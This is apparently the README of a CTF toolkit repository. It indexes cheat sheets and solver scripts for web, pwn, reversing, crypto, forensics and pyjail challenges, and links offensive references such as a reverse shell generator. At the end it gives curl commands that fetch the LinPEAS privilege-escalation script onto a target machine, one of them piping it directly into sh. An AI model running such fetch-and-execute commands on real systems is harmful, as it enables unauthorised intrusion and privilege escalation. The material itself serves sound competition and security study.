# CTF Arsenal

Reference cheat sheets, solver scripts, and payloads for CTF competitions.

## Table of Contents
- [01-web/web_payloads.md](01-web/web_payloads.md): SSTI, SQLi, LFI wrappers, file upload bypass, and command injection.
- [02-pwn/template_pwntools.py](02-pwn/template_pwntools.py): Pwntools template for local and remote buffer overflows.
- [02-pwn/pwn_cheatsheet.md](02-pwn/pwn_cheatsheet.md): GDB-pwndbg commands, cyclic offset calculation, ret2win, and ROP.
- [03-reverse/reverse_cheatsheet.md](03-reverse/reverse_cheatsheet.md): Ghidra shortcuts, ltrace, strace, UPX unpacking, and pyc decompilation.
- [04-crypto/rsa_solver.py](04-crypto/rsa_solver.py): Python script for common RSA attacks (FactorDB, small e, Fermat).
- [04-crypto/crypto_cheatsheet.md](04-crypto/crypto_cheatsheet.md): Classic ciphers, XOR scripts, hash identification, and online tools.
- [05-forensics/triage_checklist.md](05-forensics/triage_checklist.md): Triage checklist for PCAP, steganography, file headers, and memory dumps.
- [06-misc/pyjail_and_sockets.md](06-misc/pyjail_and_sockets.md): Python sandbox escape techniques and socket automation script.

---

## Essential Web References
- [dcode.fr](https://www.dcode.fr/): Cipher identification and classic cipher solver.
- [revshells.com](https://www.revshells.com/): Reverse shell generator.
- [CyberChef](https://gchq.github.io/CyberChef/): Data encoding, decoding, and analysis tool.
- [factordb.com](https://factordb.com/): Online database for integer factorization.
- [GTFOBins](https://gtfobins.github.io/): Unix binaries for security testing and privilege escalation.
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): Collection of payloads and methodologies.

---

## Quick Tool Download Commands

Commands to download and run LinPEAS on a target Linux machine:

```bash
# Run directly in memory
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Save to /tmp and execute
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh && chmod +x /tmp/lp.sh
```
